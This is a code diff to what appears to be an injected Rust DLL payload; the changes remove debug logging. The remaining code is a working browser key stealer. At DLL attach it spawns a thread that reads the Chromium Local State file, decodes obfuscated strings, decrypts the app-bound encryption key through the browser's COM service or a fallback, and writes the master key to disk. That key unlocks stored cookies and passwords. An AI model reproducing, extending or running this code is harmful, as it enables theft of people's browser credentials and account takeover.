@@ -56,13 +56,6 @@ fn get_create_thread() -> Option<CreateThreadFn> {
 
 const APPB: &[u8; 4] = b"APPB";
 
-const PAYLOAD_DEBUG: bool = {
-    match option_env!("JEWISH_DEBUG") {
-        Some(v) => v.len() == 1 && v.as_bytes()[0] == 49u8,
-        None => false,
-    }
-};
-
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
     _h: HINSTANCE,
@@ -70,23 +63,7 @@ pub unsafe extern "system" fn DllMain(
     _: *mut std::ffi::c_void,
 ) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
-        if PAYLOAD_DEBUG {
-            let log_path = std::env::temp_dir().join("payload_debug.log");
-            let _ = std::fs::write(&log_path, format!("DllMain PROCESS_ATTACH pid={}\n", std::process::id()));
-            if let Some(create_thread) = get_create_thread() {
-                let _ = std::fs::write(&log_path, format!("DllMain got CreateThread, spawning worker\n"));
-                create_thread(
-                    std::ptr::null_mut(),
-                    0,
-                    Some(worker),
-                    std::ptr::null_mut(),
-                    0,
-                    std::ptr::null_mut(),
-                );
-            } else {
-                let _ = std::fs::write(&log_path, b"DllMain FAILED to resolve CreateThread\n");
-            }
-        } else if let Some(create_thread) = get_create_thread() {
+        if let Some(create_thread) = get_create_thread() {
             create_thread(
                 std::ptr::null_mut(),
                 0,
@@ -101,32 +78,16 @@ pub unsafe extern "system" fn DllMain(
 }
 
 unsafe extern "system" fn worker(_: *mut std::ffi::c_void) -> u32 {
-    if PAYLOAD_DEBUG { step(0, "worker started"); }
     std::thread::sleep(std::time::Duration::from_millis(1500));
-    if PAYLOAD_DEBUG { step(0, "worker delay done, calling run()"); }
     let r = std::panic::catch_unwind(|| run());
-    match r {
-        Ok(Ok(())) => { if PAYLOAD_DEBUG { step(99, "run() OK"); } }
-        Ok(Err(e)) => { if PAYLOAD_DEBUG { step(99, &format!("run() ERR: {e}")); } write_error(&e); }
-        Err(_) => { if PAYLOAD_DEBUG { step(99, "PANIC"); } write_error("panic in payload"); }
+    if let Ok(Err(e)) = r {
+        write_error(&e);
     }
     0
 }
 
-pub(crate) fn step(n: u32, msg: &str) {
-    if !PAYLOAD_DEBUG { return; }
-    use std::io::Write;
-    let paths = [
-        std::env::temp_dir().join(format!("payload_step_{}.log", std::process::id())),
-        std::env::temp_dir().join("payload_debug.log"),
-    ];
-    for p in &paths {
-        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(p) {
-            let _ = writeln!(f, "step {n}: {msg}");
-            let _ = f.flush();
-        }
-    }
-}
+#[allow(dead_code)]
+pub(crate) fn step(_n: u32, _msg: &str) {}
 
 fn get_env(ct: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Option<String> {
     let var_name = aes_str(ct, key, nonce);
@@ -134,19 +95,15 @@ fn get_env(ct: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Option<String> {
 }
 
 fn run() -> Result<(), String> {
-    step(1, "start");
 
     let exe = std::env::current_exe()
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
-    step(2, &format!("exe={exe}"));
 
     let local_state_path = resolve_local_state_path(&exe)?;
-    step(3, &format!("ls_path={}", local_state_path.display()));
 
     let raw = std::fs::read_to_string(&local_state_path)
         .map_err(|e| format!("read Local State: {e}"))?;
-    step(4, &format!("raw.len={}", raw.len()));
 
     let key_b64 = {
         let app_key_name = aes_str(APP_BOUND_KEY_CT, &APP_BOUND_KEY_KEY, &APP_BOUND_KEY_NONCE);
@@ -162,14 +119,12 @@ fn run() -> Result<(), String> {
             return Err(format!("{} not found", app_key_name)).into();
         }
     };
-    step(5, "got key_b64");
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
         &key_b64,
     )
     .map_err(|e| format!("base64 decode: {e}"))?;
-    step(6, &format!("key.len={}", encrypted_key.len()));
 
     if encrypted_key.len() < 4 {
         return Err("encrypted key too short".into());
@@ -178,18 +133,15 @@ fn run() -> Result<(), String> {
         return Err("missing APPB prefix on app_bound_encrypted_key".into());
     }
     let encrypted_key = &encrypted_key[4..];
-    step(7, "APPB stripped");
 
     let browser = elv::resolve_browser(&exe);
     let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
-    step(8, &format!("browser_resolved name={browser_label}"));
 
     let com_result = if let Some(b) = browser {
         elv::decrypt_for_browser(b, encrypted_key)
     } else {
         elv::decrypt_app_bound_key(encrypted_key)
     };
-    step(9, &format!("com_result ok={}", com_result.is_ok()));
 
     let master_key = com_result.or_else(|_| {
         let r = dpflbck::try_decrypt_app_bound(encrypted_key);
@@ -203,7 +155,6 @@ fn run() -> Result<(), String> {
             master_key.len()
         ));
     }
-    step(10, "key length ok");
 
     let hex_str: String = master_key.iter().map(|b| format!("{b:02x}")).collect();
     let json = format!(
@@ -213,7 +164,6 @@ fn run() -> Result<(), String> {
 
     let path = result_path();
     std::fs::write(&path, &json).map_err(|e| format!("write result: {e}"))?;
-    step(11, "result written");
     Ok(())
 }
 
